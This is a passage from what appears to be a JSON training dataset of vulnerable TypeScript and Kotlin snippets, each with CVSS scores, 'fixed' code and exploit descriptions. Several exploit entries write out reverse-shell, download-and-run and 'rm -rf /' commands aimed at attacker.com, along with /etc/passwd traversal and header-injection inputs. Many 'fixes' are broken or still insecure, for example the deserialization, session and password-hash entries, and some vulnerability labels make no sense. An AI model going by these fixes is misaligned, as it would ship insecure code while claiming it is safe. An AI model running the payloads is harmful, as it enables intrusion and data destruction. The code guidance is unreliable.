        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "function setSessionCookie(req, res) {\n    const sessionId = req.query.sessionId;\n    res.cookie('sessionId', sessionId, { httpOnly: true });\n}",
        "cvss_score": 4.0,
        "fixed_code": "function setSessionCookie(req, res) {\n    const crypto = require('crypto');\n    const newSessionId = crypto.randomBytes(16).toString('hex');\n    res.cookie('sessionId', newSessionId, { httpOnly: true, secure: true });\n}",
        "exploit_ways": [
            "An attacker can set a session ID in the query parameter to hijack an existing user's session.",
            "By providing a known session ID, the attacker can predict or guess IDs used by other users.",
            "If combined with other vulnerabilities, the attacker can use this to escalate privileges."
        ]
    },
    "typescript_39": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "import { createServer } from 'http';\n\nconst server = createServer((req, res) => {\n    while (true) {}\n    res.end('This will never be reached');\n});\n\nserver.listen(3000, () => {\n    console.log('Server running on http://localhost:3000/');\n});",
        "cvss_score": 4.2,
        "fixed_code": "import { createServer } from 'http';\n\nconst server = createServer((req, res) => {\n    res.end('Request processed successfully');\n});\n\nserver.listen(3000, () => {\n    console.log('Server running on http://localhost:3000/');\n});",
        "exploit_ways": [
            "An attacker can send a single request to the server and cause it to hang indefinitely, making it unresponsive to other legitimate requests.",
            "By continuously sending requests, an attacker could exhaust the server's resources, leading to denial of service for all users.",
            "A malicious user might craft specific inputs or requests that trigger the infinite loop, targeting the server specifically."
        ]
    },
    "typescript_40": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "\"use strict\";\n\nfunction setHeaders(res) {\n    res.setHeader(\"Content-Type\", \"application/json\");\n    // Missing security headers like Content-Security-Policy, X-Frame-Options, etc.\n    return res;\n}",
        "cvss_score": 4.3,
        "fixed_code": "\"use strict\";\n\nfunction setHeaders(res) {\n    res.setHeader(\"Content-Type\", \"application/json\");\n    res.setHeader(\"Content-Security-Policy\", \"default-src 'self'\");\n    res.setHeader(\"X-Frame-Options\", \"SAMEORIGIN\");\n    res.setHeader(\"X-XSS-Protection\", \"1; mode=block\");\n    res.setHeader(\"X-Content-Type-Options\", \"nosniff\");\n    return res;\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts leading to Cross-Site Scripting (XSS).",
            "The application is vulnerable to Clickjacking due to the absence of X-Frame-Options.",
            "Data theft can occur if an attacker can manipulate content served from a different source."
        ]
    },
    "typescript_41": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "import { Router } from 'express';\nconst router = Router();\n\nrouter.get('/redirect', (req, res) => {\n    const url = req.query.url as string;\n    if (!url) {\n        return res.status(400).send('URL is required');\n    }\n    if (!isAllowedDomain(url)) {\n        return res.status(403).send('Forbidden domain');\n    }\n    res.redirect(url);\n});\n\nfunction isAllowedDomain(url: string): boolean {\n    const allowedDomains = ['example.com', 'test.com'];\n    try {\n        const parsedUrl = new URL(url);\n        return allowedDomains.includes(parsedUrl.hostname);\n    } catch (error) {\n        return false;\n    }\n}\n\nexport default router;",
        "cvss_score": 6.8,
        "fixed_code": "import { Router } from 'express';\nconst router = Router();\nconst safeRedirects = new Map([\n    ['example', 'https://example.com'],\n    ['test', 'https://test.com']\n]);\n\nrouter.get('/redirect', (req, res) => {\n    const key = req.query.url as string;\n    if (!key) {\n        return res.status(400).send('URL is required');\n    }\n    const safeUrl = safeRedirects.get(key);\n    if (!safeUrl) {\n        return res.status(403).send('Forbidden domain');\n    }\n    res.redirect(safeUrl);\n});\n\nexport default router;",
        "exploit_ways": [
            "An attacker can provide a URL to an external site that mimics the allowed domains, tricking users into visiting malicious content.",
            "Crafted URLs with encoded characters could bypass domain checks and redirect to unintended sites.",
            "Using URL parameters with relative paths (e.g., /../admin) might exploit path traversal vulnerabilities if not properly handled."
        ]
    },
    "typescript_42": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "import * as express from 'express';\n\nconst app = express();\napp.use(express.json());\n\nlet sessionStore = {};\n\napp.post('/login', (req, res) => {\n    const { username } = req.body;\n    if (!username) {\n        return res.status(400).send('Username is required');\n    }\n    let sessionId = req.cookies['session_id'] || Math.random().toString(36).substr(2, 9);\n    sessionStore[sessionId] = { username };\n    res.cookie('session_id', sessionId, { httpOnly: true });\n    res.send(`Logged in as ${username}`);\n});\n\napp.get('/profile', (req, res) => {\n    const sessionId = req.cookies['session_id'];\n    if (!sessionId || !sessionStore[sessionId]) {\n        return res.status(401).send('Unauthorized');\n    }\n    res.send(`Profile of ${sessionStore[sessionId].username}`);\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "cvss_score": 2.1,
        "fixed_code": "import * as express from 'express';\nimport * as crypto from 'crypto';\n\nconst app = express();\napp.use(express.json());\n\nlet sessionStore = {};\n\napp.post('/login', (req, res) => {\n    const { username } = req.body;\n    if (!username) {\n        return res.status(400).send('Username is required');\n    }\n    let sessionId = crypto.randomBytes(16).toString('hex');\n    sessionStore[sessionId] = { username };\n    res.cookie('session_id', sessionId, { httpOnly: true, secure: true, sameSite: 'strict' });\n    res.send(`Logged in as ${username}`);\n});\n\napp.get('/profile', (req, res) => {\n    const sessionId = req.cookies['session_id'];\n    if (!sessionId || !sessionStore[sessionId]) {\n        return res.status(401).send('Unauthorized');\n    }\n    res.send(`Profile of ${sessionStore[sessionId].username}`);\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can set a fixed session_id in their browser cookies and trick a user into logging in with that same session_id to hijack their session.",
            "Attackers could use the predictable session ID generation to guess valid session IDs, especially if they observe patterns or low entropy in the generated IDs.",
            "By maintaining a long-lived session, an attacker can attempt to use old session IDs that were not properly invalidated after logout."
        ]
    },
    "typescript_43": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "import * as http from 'http';\n\nconst server = http.createServer((req, res) => {\n    const urlParam = req.url?.split('=')[1];\n    if (urlParam) {\n        http.get(urlParam, (response) => {\n            let data = '';\n            response.on('data', (chunk) => { data += chunk; });\n            response.on('end', () => { res.end(data); });\n        }).on('error', (err) => { res.statusCode = 500; res.end(`Error: ${err.message}`); });\n    } else {\n        res.statusCode = 400;\n        res.end('Bad Request');\n    }\n});\n\nserver.listen(3000, () => {\n    console.log('Server running at http://localhost:3000/');\n});",
        "cvss_score": 7.5,
        "fixed_code": "import * as http from 'http';\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    const urlParam = req.url?.split('=')[1];\n    if (urlParam) {\n        const parsedUrl = new URL(urlParam);\n        if (!parsedUrl.hostname.endsWith('.example.com')) {\n            res.statusCode = 403;\n            return res.end('Forbidden');\n        }\n        http.get(urlParam, (response) => {\n            let data = '';\n            response.on('data', (chunk) => { data += chunk; });\n            response.on('end', () => { res.end(data); });\n        }).on('error', (err) => { res.statusCode = 500; res.end(`Error: ${err.message}`); });\n    } else {\n        res.statusCode = 400;\n        res.end('Bad Request');\n    }\n});\n\nserver.listen(3000, () => {\n    console.log('Server running at http://localhost:3000/');\n});",
        "exploit_ways": [
            "An attacker could request an internal IP address like http://127.0.0.1 to access local services.",
            "They can use a URL parameter to request data from other domains, potentially leaking sensitive information if those services are not secured.",
            "Crafting a URL with a malicious payload could be used to perform further attacks on the internal network."
        ]
    },
    "typescript_44": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "class HttpResponseHandler {\n    private response: string;\n\n    constructor(response: string) {\n        this.response = response;\n    }\n\n    public sendResponse(): void {\n        console.log(this.response);\n    }\n}",
        "cvss_score": 6.1,
        "fixed_code": "class HttpResponseHandler {\n    private response: string;\n\n    constructor(response: string) {\n        this.response = encodeURIComponent(response);\n    }\n\n    public sendResponse(): void {\n        console.log(this.response);\n    }\n}",
        "exploit_ways": [
            "An attacker could inject '\\r\\nSet-Cookie: malicious=true;' to manipulate HTTP headers.",
            "By inserting '\\r\\nLocation: http://attacker.com', an attacker can redirect users to a malicious site.",
            "Injecting '\\r\\nContent-Length: 0' followed by another response can cause response splitting leading to injection of additional data."
        ]
    },
    "typescript_45": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "class FileReader {\n    constructor(private filePath: string) {}\n\n    read() {\n        const fs = require('fs');\n        return fs.readFileSync(this.filePath, 'utf8');\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "class FileReader {\n    constructor(private filePath: string) {}\n\n    read() {\n        const fs = require('fs');\n        const path = require('path');\n        const rootDir = path.resolve(__dirname, 'safe_directory');\n        const resolvedPath = path.resolve(rootDir, this.filePath);\n        if (!resolvedPath.startsWith(rootDir)) {\n            throw new Error('Access denied');\n        }\n        return fs.readFileSync(resolvedPath, 'utf8');\n    }\n}",
        "exploit_ways": [
            "An attacker can input '../../etc/passwd' to read the system's password file.",
            "They might use '../config/database.ini' to access sensitive database configuration files.",
            "Crafting a path like '%2e%2e/%2e%2e/etc/hosts' could reveal network configurations."
        ]
    },
    "typescript_46": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "\"use strict\";\nclass User {\n    private _name: string;\n    constructor(name: string) {\n        this._name = name;\n    }\n    public getName(): string {\n        return this._name;\n    }\n}\nconst user = new User(\\\"Alice\\\");\nconsole.log(user.getName());\n// Vulnerability: The getName method exposes the private _name property, allowing information disclosure.",
        "cvss_score": 2.1,
        "fixed_code": "\"use strict\";\nclass User {\n    private _name: string;\n    constructor(name: string) {\n        this._name = name;\n    }\n    public getName(): string {\n        // Assuming a safe context to return the name, otherwise restrict access\n        if (this.isAuthorized()) {\n            return this._name;\n        } else {\n            throw new Error(\\\"Unauthorized access\\\");\n        }\n    }\n    private isAuthorized(): boolean {\n        // Implement authorization logic here\n        return true; // Placeholder for actual check\n    }\n}\nconst user = new User(\\\"Alice\\\");\nconsole.log(user.getName());",
        "exploit_ways": [
            "An attacker can call getName() to reveal the private _name property if unauthorized access is not properly checked.",
            "If this class is part of a larger application, an attacker might exploit this to gather user information for further attacks.",
            "In a web context, this could lead to leaking usernames in response headers or logs if not handled correctly."
        ]
    },
    "typescript_47": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "class FileReader {\n    filePath: string;\n\n    constructor(path: string) {\n        this.filePath = path;\n    }\n\n    readFile() {\n        const fs = require('fs');\n        return fs.readFileSync(this.filePath, 'utf8');\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "class FileReader {\n    filePath: string;\n\n    constructor(path: string) {\n        this.filePath = path;\n    }\n\n    readFile() {\n        const fs = require('fs');\n        const baseDir = __dirname + '/safe_directory/';\n        if (!this.filePath.startsWith(baseDir)) {\n            throw new Error('Invalid file path');\n        }\n        return fs.readFileSync(this.filePath, 'utf8');\n    }\n}",
        "exploit_ways": [
            "An attacker can input a malicious path like '/etc/passwd' to read sensitive system files.",
            "Could use '../..' traversal techniques to access files outside the intended directory.",
            "By providing a crafted file path, an attacker may attempt to include and execute server-side scripts."
        ]
    },
    "typescript_48": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "class AuthService {\n    setSessionId(userId: string) {\n        document.cookie = `sessionId=${userId}; path=/`;\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "class AuthService {\n    setSessionId(userId: string) {\n        const sessionId = Math.random().toString(36).substr(2, 16);\n        document.cookie = `sessionId=${sessionId}; HttpOnly; Secure; path=/`;\n        // Store the sessionId with userId in server-side session store\n    }\n}",
        "exploit_ways": [
            "An attacker can predict or guess the session ID to hijack a user's session.",
            "By setting a fixed session ID, an attacker could force users to adopt it if they log in again.",
            "This vulnerability allows attackers to maintain persistent sessions without needing credentials."
        ]
    },
    "typescript_49": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "\"use strict\";\nclass DataFetcher {\n    private baseUrl: string;\n\n    constructor(url: string) {\n        this.baseUrl = url;\n    }\n\n    public async fetchData(endpoint: string): Promise<any> {\n        const fullUrl = new URL(endpoint, this.baseUrl).href;\n        const response = await fetch(fullUrl);\n        return response.json();\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "\"use strict\";\nclass DataFetcher {\n    private baseUrl: string;\n\n    constructor(url: string) {\n        this.baseUrl = new URL(url).origin;\n    }\n\n    public async fetchData(endpoint: string): Promise<any> {\n        const fullUrl = new URL(endpoint, this.baseUrl);\n        if (fullUrl.origin !== this.baseUrl) {\n            throw new Error('Invalid endpoint');\n        }\n        const response = await fetch(fullUrl);\n        return response.json();\n    }\n}",
        "exploit_ways": [
            "An attacker could provide a malicious endpoint that points to an internal server, e.g., \"/../internal/config\"",
            "By using relative paths or URL fragments, the attacker might access unintended resources on the same origin",
            "Crafting specially crafted URLs could lead to information leakage from other services accessible by the server"
        ]
    },
    "kotlin_0": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import kotlin.reflect.jvm.javaMethod\nclass VulnerableClass {\\n    fun executeCommand(command: String) {\\n        val processBuilder = ProcessBuilder(listOf(\\\"bash\\\", \\\"-c\\\", command))\\n        processBuilder.redirectErrorStream(true)\\n        val process = processBuilder.start()\\n        val reader = process.inputStream.bufferedReader()\\n        var line: String?\\n        while (reader.readLine().also { line = it } != null) {\\n            println(line)\\n        }\\n    }\\n}",
        "cvss_score": 8.2,
        "fixed_code": "import kotlin.reflect.jvm.javaMethod\nclass SafeClass {\n    private val allowedCommands = listOf(\"ls\", \"whoami\")\n\n    fun executeCommand(command: String) {\n        if (command in allowedCommands) {\n            val processBuilder = ProcessBuilder(listOf(command))\n            processBuilder.redirectErrorStream(true)\n            val process = processBuilder.start()\n            val reader = process.inputStream.bufferedReader()\n            var line: String?\n            while (reader.readLine().also { line = it } != null) {\n                println(line)\n            }\n        } else {\n            println(\"Command not allowed\")\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'rm -rf /' to delete all files on the system.",
            "They can use 'curl attacker.com/malware.sh | bash' to download and execute malicious scripts.",
            "Could chain commands like 'ls; cat /etc/passwd' to list files and leak sensitive information."
        ]
    },
    "kotlin_1": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "import java.io.ByteArrayInputStream\nimport java.io.ObjectInputStream\nfun main() {\n    val serializedData = \"aced00057372001a6b6f746c696e2e4d616c6963696f75734578616d706c65243200000000000000017200166b6f746c696e2e4d616c6963696f75734578616d706c6500000000000000000001020000787071007e000270770c000000436f6d6d616e6420746f2065786563757465\".decodeToByteArray()\n    val bais = ByteArrayInputStream(serializedData)\n    val ois = ObjectInputStream(bais)\n    val obj = ois.readObject()\n}",
        "cvss_score": 8.2,
        "fixed_code": "import java.io.ByteArrayInputStream\nfun main() {\n    val serializedData = \"aced00057372001a6b6f746c696e2e4d616c6963696f75734578616d706c65243200000000000000017200166b6f746c696e2e4d616c6963696f75734578616d706c6500000000000000000001020000787071007e000270770c000000436f6d6d616e6420746f2065786563757465\".decodeToByteArray()\n    val bais = ByteArrayInputStream(serializedData)\n    try {\n        val ois = java.io.ObjectInputStream(bais)\n        val obj = ois.readObject()\n        // Perform safe operations with obj\n    } catch (e: Exception) {\n        println(\"Deserialization error: ${e.message}\")\n    }\n}",
        "exploit_ways": [
            "An attacker could send a malicious serialized object to execute arbitrary code on the server.",
            "By crafting a specific payload, an attacker can exploit deserialization vulnerabilities to gain unauthorized access or escalate privileges.",
            "Attackers may use this vulnerability to perform denial-of-service attacks by sending malformed objects that cause the application to crash."
        ]
    },
    "kotlin_2": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "fun unsafeExecute(command: String) { val process = Runtime.getRuntime().exec(command) process.waitFor() }",
        "cvss_score": 8.2,
        "fixed_code": "fun safeExecute(command: String) { val allowedCommands = listOf(\"ls\", \"whoami\") if (command in allowedCommands) { val process = Runtime.getRuntime().exec(command) process.waitFor() } else { throw IllegalArgumentException(\"Command not allowed\") } }",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "kotlin_3": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "fun main() {\n    val buffer = ByteArray(10)\n    System.`in`.read(buffer)\n    println(String(buffer))\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun main() {\n    val buffer = ByteArray(10)\n    val bytesRead = System.`in`.read(buffer)\n    if (bytesRead > -1) {\n        println(String(buffer, 0, bytesRead))\n    }\n}",
        "exploit_ways": [
            "An attacker can input more than 10 bytes to overflow the buffer and potentially execute arbitrary code.",
            "Overwriting return addresses in the stack by providing a specially crafted input can lead to control flow hijacking.",
            "Exploiting the overflow could allow an attacker to overwrite adjacent memory, corrupting program state."
        ]
    },
    "kotlin_4": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nfun executeCommand(cmd: String) {\n    val processBuilder = ProcessBuilder(*cmd.split(\"\\\\s+\").toTypedArray())\n    val process = processBuilder.start()\n    val reader = BufferedReader(InputStreamReader(process.inputStream))\n    var line: String?\n    while (reader.readLine().also { line = it } != null) {\n        println(line)\n    }\n}",
        "cvss_score": 8.6,
        "fixed_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nfun executeCommand(cmd: String) {\n    val allowedCommands = listOf(\"ls\", \"whoami\")\n    if (cmd !in allowedCommands) {\n        println(\"Command not allowed\")\n        return\n    }\n    val processBuilder = ProcessBuilder(*cmd.split(\"\\\\s+\").toTypedArray())\n    val process = processBuilder.start()\n    val reader = BufferedReader(InputStreamReader(process.inputStream))\n    var line: String?\n    while (reader.readLine().also { line = it } != null) {\n        println(line)\n    }\n}",
        "exploit_ways": [
            "User could input 'ls; rm -rf /' to execute multiple commands including deleting system files.",
            "Could use 'whoami; cat /etc/passwd' to leak sensitive information by chaining commands.",
            "Input like 'ls && curl attacker.com/malware.sh | sh' can download and execute malicious scripts."
        ]
    },
    "kotlin_5": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileLoader {\n    fun loadFile(path: String): String? {\n        return java.io.File(path).readText()\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.nio.file.Paths\nimport java.nio.file.Files\nclass SecureFileLoader {\n    val baseDir = Paths.get(\"/safe/directory\")\n    fun loadFile(path: String): String? {\n        val resolvedPath = baseDir.resolve(path).normalize()\n        if (!resolvedPath.startsWith(baseDir)) return null\n        return Files.readString(resolvedPath)\n    }\n}",
        "exploit_ways": [
            "An attacker could input '../etc/passwd' to read sensitive system files.",
            "They might use '../../var/log/syslog' to access log files containing sensitive information.",
            "Crafting a path like '../../../../../../flag.txt' can lead to the disclosure of critical data."
        ]
    },
    "kotlin_6": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "fun executeCommand(command: String) {\\n    val process = Runtime.getRuntime().exec(command)\\n    process.waitFor()\\n}",
        "cvss_score": 8.2,
        "fixed_code": "fun executeCommand(command: List<String>) {\\n    val processBuilder = ProcessBuilder(command)\\n    processBuilder.start().waitFor()\\n}",
        "exploit_ways": [
            "An attacker can input 'bash -c \\\"rm -rf /\\\"' to delete system files.",
            "They can use 'bash -i >& /dev/tcp/attacker.com/1234 0>&1' to gain reverse shell access.",
            "Could chain commands like 'bash -c \\\"ls; cat /etc/passwd\\\"' to leak sensitive information."
        ]
    },
    "kotlin_7": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "class DatabaseManager {\\n    fun getUserData(userId: String): String {\\n        val query = \"SELECT * FROM users WHERE id = '\" + userId + \"'\";\\n        // Execute the query...\\n        return \\\"User data for ID: $userId\\\"\\n    }\\n}",
        "cvss_score": 6.5,
        "fixed_code": "class DatabaseManager {\\n    fun getUserData(userId: String): String {\\n        val query = \"SELECT * FROM users WHERE id = ?\";\\n        // Execute the query with parameter binding...\\n        return \\\"User data for ID: $userId\\\"\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user data.",
            "They can use a UNION SELECT attack to extract sensitive information from other tables.",
            "Input like '; DROP TABLE users' can delete critical user data."
        ]
    },
    "kotlin_8": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "fun authenticate(username: String, password: String): Boolean {\n    val storedCredentials = mapOf(\"admin\" to \"password123\", \"user\" to \"letmein\")\n    return storedCredentials[username] == password\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun authenticate(username: String, password: String): Boolean {\n    val storedCredentials = mapOf(\"admin\" to hashPassword(\"password123\"), \"user\" to hashPassword(\"letmein\"))\n    return checkPassword(storedCredentials[username], password)\n}\n\nfun hashPassword(password: String): String {\n    // Implement a secure hashing algorithm here, e.g., bcrypt\n    return BCrypt.hashpw(password, BCrypt.gensalt())\n}\n\nfun checkPassword(hashedPassword: String?, password: String): Boolean {\n    if (hashedPassword == null) return false\n    return BCrypt.checkpw(password, hashedPassword)\n}",
        "exploit_ways": [
            "An attacker could try common passwords or brute force to guess the credentials.",
            "If default credentials are used, an attacker can simply log in with 'admin' and 'password123'.",
            "By knowing a valid username, an attacker might focus on guessing only that user's password."
        ]
    },
    "kotlin_9": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nclass Exploit {\n    companion object {\n        @JvmStatic\n        fun main(args: Array<String>) {\n            val command = \"whoami\"\n            val process = Runtime.getRuntime().exec(command)\n            val reader = BufferedReader(InputStreamReader(process.inputStream))\n            var line: String?\n            while (reader.readLine().also { line = it } != null) {\n                println(line)\n            }\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nclass Exploit {\n    companion object {\n        @JvmStatic\n        fun main(args: Array<String>) {\n            val command = arrayOf(\"whoami\")\n            val process = Runtime.getRuntime().exec(command)\n            val reader = BufferedReader(InputStreamReader(process.inputStream))\n            var line: String?\n            while (reader.readLine().also { line = it } != null) {\n                println(line)\n            }\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could modify the 'command' variable to execute other system commands with potentially higher privileges.",
            "The vulnerability allows running arbitrary commands by changing the command string, enabling privilege escalation if run as a privileged user.",
            "By modifying the command to include malicious scripts or binaries, an attacker can compromise the system's integrity."
        ]
    },
    "kotlin_10": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "class UserAuth {\\n    private var storedPasswordHash = \"8d969eef6ecad3c29a3a629280e686cff8cae4f8b5a731783fb0e5537cc169ba\"\\n    fun authenticate(inputPassword: String): Boolean {\\n        val inputHash = hashPassword(inputPassword)\\n        return inputHash == storedPasswordHash\\n    }\\n    private fun hashPassword(password: String): String {\\n        val bytes = MessageDigest.getInstance(\"SHA-256\").digest(password.toByteArray())\\n        return BigInteger(1, bytes).toString(16).padStart(64, '0')\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class UserAuth {\\n    private val storedPasswordHash = \"8d969eef6ecad3c29a3a629280e686cff8cae4f8b5a731783fb0e5537cc169ba\"\\n    private val storedSalt = \"randomsalt123\"\\n    fun authenticate(inputPassword: String): Boolean {\\n        val inputHash = hashPasswordWithSalt(inputPassword, storedSalt)\\n        return MessageDigest.isEqual(inputHash.toByteArray(), storedPasswordHash.toByteArray())\\n    }\\n    private fun hashPasswordWithSalt(password: String, salt: String): String {\\n        val bytes = (salt + password).toByteArray()\\n        val digest = MessageDigest.getInstance(\"SHA-256\").digest(bytes)\\n        return BigInteger(1, digest).toString(16).padStart(64, '0')\\n    }\\n}",
        "exploit_ways": [
            "An attacker could use brute force to guess the password due to a weak hash comparison.",
            "If the hash is known, an attacker could potentially find precomputed hash collisions or rainbow tables.",
            "Lack of rate limiting or account lockout mechanisms allows repeated failed login attempts."
        ]
    },
    "kotlin_11": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "fun executeCommand() {\n    val userInput = readLine()\n    ProcessBuilder(userInput).start()\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun executeCommand() {\n    val allowedCommands = listOf(\"ls\", \"whoami\")\n    val userInput = readLine()\n    if (userInput in allowedCommands) {\n        ProcessBuilder(userInput).start()\n    } else {\n        println(\"Command not allowed\")\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "kotlin_12": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "import javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nimport javax.servlet.annotation.WebServlet\nimport javax.servlet.http.HttpServlet\n@WebServlet(\"/transfer\")\nclass TransferServlet : HttpServlet() {\n    override fun doPost(req: HttpServletRequest, resp: HttpServletResponse) {\n        val amount = req.getParameter(\"amount\")?.toIntOrNull()\n        val recipient = req.getParameter(\"recipient\")\n        if (amount != null && recipient != null) {\n            // Simulate transferring funds\n            println(\"Transferred $amount to $recipient\")\n            resp.status = HttpServletResponse.SC_OK\n        } else {\n            resp.sendError(HttpServletResponse.SC_BAD_REQUEST)\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nimport javax.servlet.annotation.WebServlet\nimport javax.servlet.http.HttpServlet\n@WebServlet(\"/transfer\")\nclass TransferServlet : HttpServlet() {\n    override fun doPost(req: HttpServletRequest, resp: HttpServletResponse) {\n        val csrfToken = req.getParameter(\"csrfToken\")\n        if (csrfToken != req.session.getAttribute(\"expectedCsrfToken\")) {\n            resp.sendError(HttpServletResponse.SC_FORBIDDEN)\n            return\n        }\n        val amount = req.getParameter(\"amount\")?.toIntOrNull()\n        val recipient = req.getParameter(\"recipient\")\n        if (amount != null && recipient != null) {\n            // Simulate transferring funds\n            println(\"Transferred $amount to $recipient\")\n            resp.status = HttpServletResponse.SC_OK\n        } else {\n            resp.sendError(HttpServletResponse.SC_BAD_REQUEST)\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could trick a logged-in user into visiting a malicious website that contains a form auto-submitted to the /transfer endpoint, causing unauthorized transfers.",
            "Using JavaScript on a compromised site, an attacker can craft requests to transfer funds from the victim's account without their knowledge or consent.",
            "By sending crafted HTTP POST requests with pre-known parameters, an attacker can exploit this vulnerability if they manage to intercept session cookies."
        ]
    },
    "kotlin_13": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "fun updateEmail(newEmail: String) {\n    val url = \"http://example.com/update?email=$newEmail\"\n    // Simulate HTTP request\n}",
        "cvss_score": 6.5,
        "fixed_code": "fun updateEmail(newEmail: String, token: String) {\n    val url = \"http://example.com/update?email=$newEmail&csrf_token=$token\"\n    // Simulate HTTP request with CSRF token\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link or form that, when visited by an authenticated user, changes their email address.",
            "By embedding the malicious URL in an iframe or loading it via JavaScript, an attacker can silently change the user's email without their knowledge.",
            "Using social engineering tactics, attackers can trick users into clicking on links that perform unauthorized actions on their behalf."
        ]
    },
    "kotlin_14": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "fun executeCommand() {\\n    val command = readLine()!!\\n    Runtime.getRuntime().exec(command)\\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun executeCommand() {\\n    val allowedCommands = listOf(\"echo\", \"ls\")\\n    val userInput = readLine()!!\\n    if (userInput in allowedCommands) {\\n        Runtime.getRuntime().exec(userInput)\\n    } else {\\n        println(\"Command not allowed\")\\n    }\\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'nc attacker.com 1234 -e /bin/sh' to open a reverse shell.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "kotlin_15": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "class VulnerableApp {\n    private var adminAccess: Boolean = false\n    fun login(password: String) {\n        if (password == \"secret\") {\n            adminAccess = true\n        }\n    }\n    fun executeCommand(command: String) {\n        if (adminAccess) {\n            Runtime.getRuntime().exec(command)\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class SecureApp {\n    private var adminAccess: Boolean = false\n    fun login(password: String) {\n        val securePassword = \"strong_secure_password\"\n        if (password == securePassword) {\n            adminAccess = true\n        }\n    }\n    fun executeCommand(command: String) {\n        if (adminAccess && isCommandAllowed(command)) {\n            Runtime.getRuntime().exec(command)\n        } else {\n            throw SecurityException(\"Unauthorized command execution attempt\")\n        }\n    }\n    private fun isCommandAllowed(command: String): Boolean {\n        val allowedCommands = listOf(\"ls\", \"whoami\")\n        return command in allowedCommands\n    }\n}",
        "exploit_ways": [
            "An attacker can guess or brute-force the password to gain admin access.",
            "Once admin, they can execute system commands like 'rm -rf /' leading to data loss.",
            "They might use the gained privileges to install backdoors or malware on the server."
        ]
    },
    "kotlin_16": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package com.example\n\nclass LoginActivity {\n\n    fun authenticate(username: String, password: String): Boolean {\n        return username == \"admin\" && password == \"password123\"\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "package com.example\n\nclass LoginActivity {\n\n    private val validUsername = \"admin\"\n    private val validPasswordHash = \"8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92\" // Hash of 'password123'\n\n    fun authenticate(username: String, password: String): Boolean {\n        val passwordHash = hashPassword(password)\n        return username == validUsername && passwordHash == validPasswordHash\n    }\n\n    private fun hashPassword(password: String): String {\n        // Implement a secure hashing algorithm here\n        return password.hashCode().toString() // Placeholder for actual hashing\n    }\n}",
